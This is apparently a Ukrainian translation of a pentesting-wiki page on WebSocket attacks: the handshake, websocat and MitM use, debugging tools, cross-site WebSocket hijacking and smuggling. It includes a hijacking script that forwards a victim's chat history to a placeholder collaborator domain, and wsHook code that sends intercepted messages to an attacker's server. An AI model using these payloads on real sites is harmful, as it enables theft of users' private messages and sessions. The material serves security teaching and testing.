# WebSocket Атаки

{{#include ../banners/hacktricks-training.md}}

## Що таке WebSockets

З'єднання WebSocket встановлюються через початковий **HTTP** рукопашний обмін і призначені для **тривалого** використання, що дозволяє двостороннє обмін повідомленнями в будь-який час без необхідності в транзакційній системі. Це робить WebSockets особливо вигідними для додатків, які вимагають **низької затримки або ініційованого сервером зв'язку**, таких як потоки фінансових даних в реальному часі.

### Встановлення з'єднань WebSocket

Детальне пояснення щодо встановлення з'єднань WebSocket можна знайти [**тут**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). Підсумовуючи, з'єднання WebSocket зазвичай ініціюються за допомогою JavaScript на стороні клієнта, як показано нижче:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
Протокол `wss` позначає з'єднання WebSocket, захищене **TLS**, тоді як `ws` вказує на **незахищене** з'єднання.

Під час встановлення з'єднання виконується обмін повідомленнями між браузером і сервером через HTTP. Процес обміну повідомленнями включає в себе надсилання запиту браузером і відповідь сервера, як показано в наступних прикладах:

Браузер надсилає запит на обмін повідомленнями:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Відповідь на рукопожаття сервера:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
З'єднання залишається відкритим для обміну повідомленнями в обох напрямках після встановлення.

**Ключові моменти рукостискання WebSocket:**

- Заголовки `Connection` та `Upgrade` сигналізують про ініціацію рукостискання WebSocket.
- Заголовок `Sec-WebSocket-Version` вказує на бажану версію протоколу WebSocket, зазвичай `13`.
- У заголовку `Sec-WebSocket-Key` надсилається випадкове значення, закодоване в Base64, що забезпечує унікальність кожного рукостискання, що допомагає запобігти проблемам з кешуючими проксі. Це значення не призначене для аутентифікації, а для підтвердження того, що відповідь не згенерована неправильно налаштованим сервером або кешем.
- Заголовок `Sec-WebSocket-Accept` у відповіді сервера є хешем `Sec-WebSocket-Key`, що підтверджує намір сервера відкрити з'єднання WebSocket.

Ці функції забезпечують безпеку та надійність процесу рукостискання, прокладаючи шлях для ефективної комунікації в реальному часі.

### Linux console

Ви можете використовувати `websocat` для встановлення сирого з'єднання з вебсокетом.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Або для створення сервера websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM вебсокет з'єднання

Якщо ви виявите, що клієнти підключені до **HTTP вебсокету** з вашої поточної локальної мережі, ви можете спробувати [ARP Spoofing Attack](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing), щоб виконати атаку MitM між клієнтом і сервером.\
Якщо клієнт намагається підключитися, ви можете використовувати:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Перерахування Websockets

Ви можете використовувати **інструмент** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **для автоматичного виявлення, ідентифікації та пошуку відомих** **вразливостей** у websockets.

### Інструменти налагодження Websocket

- **Burp Suite** підтримує MitM комунікацію websockets аналогічно тому, як це робить для звичайної HTTP комунікації.
- Розширення **[**socketsleuth**](https://github.com/snyk/socketsleuth)** для Burp Suite дозволить вам краще керувати комунікаціями Websocket у Burp, отримуючи **історію**, встановлюючи **правила перехоплення**, використовуючи **правила збігу та заміни**, використовуючи **Intruder** та **AutoRepeater.**
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Скорочено від "**WebSocket/Socket.io Proxy**", цей інструмент, написаний на Node.js, надає інтерфейс для **захоплення, перехоплення, надсилання користувацьких** повідомлень та перегляду всіх комунікацій WebSocket і Socket.IO між клієнтом і сервером.
- [**wsrepl**](https://github.com/doyensec/wsrepl) є **інтерактивним websocket REPL**, спеціально розробленим для тестування на проникнення. Він надає інтерфейс для спостереження за **вхідними повідомленнями websocket і надсилання нових**, з простим у використанні фреймворком для **автоматизації** цієї комунікації.&#x20;
- [**https://websocketking.com/**](https://websocketking.com/) це **веб для комунікації** з іншими вебами за допомогою **websockets**.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) серед інших типів комунікацій/протоколів, надає **веб для комунікації** з іншими вебами за допомогою **websockets.**

## Лабораторія Websocket

У [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) у вас є код для запуску вебу за допомогою websockets, а в [**цьому пості**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) ви можете знайти пояснення.

## Перехоплення WebSocket між сайтами (CSWSH)

**Перехоплення WebSocket між сайтами**, також відоме як **перехоплення WebSocket з різних джерел**, визначається як специфічний випадок **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)**, що впливає на обміни WebSocket. Ця вразливість виникає, коли обміни WebSocket аутентифікуються виключно через **HTTP cookies** без **CSRF токенів** або подібних заходів безпеки.

Зловмисники можуть скористатися цим, розмістивши **шкідливу веб-сторінку**, яка ініціює з'єднання WebSocket між сайтами до вразливої програми. Внаслідок цього це з'єднання розглядається як частина сесії жертви з програмою, експлуатуючи відсутність захисту CSRF у механізмі обробки сесій.

### Простий напад

Зверніть увагу, що при **встановленні** з'єднання **websocket** **cookie** **надсилається** на сервер. **Сервер** може використовувати його для **пов'язування** кожного **конкретного** **користувача** з його **сесією websocket на основі надісланого cookie**.

Тоді, якщо, наприклад, **websocket** **сервер** **повертає історію розмови** користувача, якщо надсилається повідомлення з "**READY"**, тоді **простий XSS**, що встановлює з'єднання (**cookie** буде **надіслано** **автоматично** для авторизації жертви) **надсилаючи** "**READY**" зможе **отримати** історію **розмови**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie with a different subdomain

У цьому блозі [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) зловмисник зміг **виконати довільний Javascript у піддомені** домену, де відбувалася комунікація через веб-сокети. Оскільки це був **піддомен**, **кукі** надсилалися, і оскільки **Websocket не перевіряв Origin належним чином**, було можливим зв'язуватися з ним і **викрадати токени**.

### Stealing data from user

Скопіюйте веб-додаток, який ви хочете наслідувати (файли .html, наприклад), і всередині скрипта, де відбувається комунікація через веб-сокети, додайте цей код:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Тепер завантажте файл `wsHook.js` з [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) і **збережіть його в папці з веб-файлами**.\
Відкриваючи веб-додаток і змушуючи користувача підключитися до нього, ви зможете вкрасти надіслані та отримані повідомлення через websocket:
```javascript
sudo python3 -m http.server 80
```
## Умови гонки

Умови гонки в WebSockets також існують, [перевірте цю інформацію, щоб дізнатися більше](race-condition.md#rc-in-websockets).

## Інші вразливості

Оскільки Web Sockets є механізмом для **відправки даних на серверну та клієнтську сторони**, залежно від того, як сервер і клієнт обробляють інформацію, **Web Sockets можуть бути використані для експлуатації кількох інших вразливостей, таких як XSS, SQLi або будь-яка інша загальна веб-вразливість, використовуючи введення користувача з вебсокета.**

## **WebSocket Smuggling**

Ця вразливість може дозволити вам **обійти обмеження зворотних проксі**, змушуючи їх вірити, що **вебсокетна комунікація була встановлена** (навіть якщо це не так). Це може дозволити зловмиснику **отримати доступ до прихованих кінцевих точок**. Для отримання додаткової інформації перевірте наступну сторінку:

{{#ref}}
h2c-smuggling.md
{{#endref}}

## Посилання

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{{#include ../banners/hacktricks-training.md}}
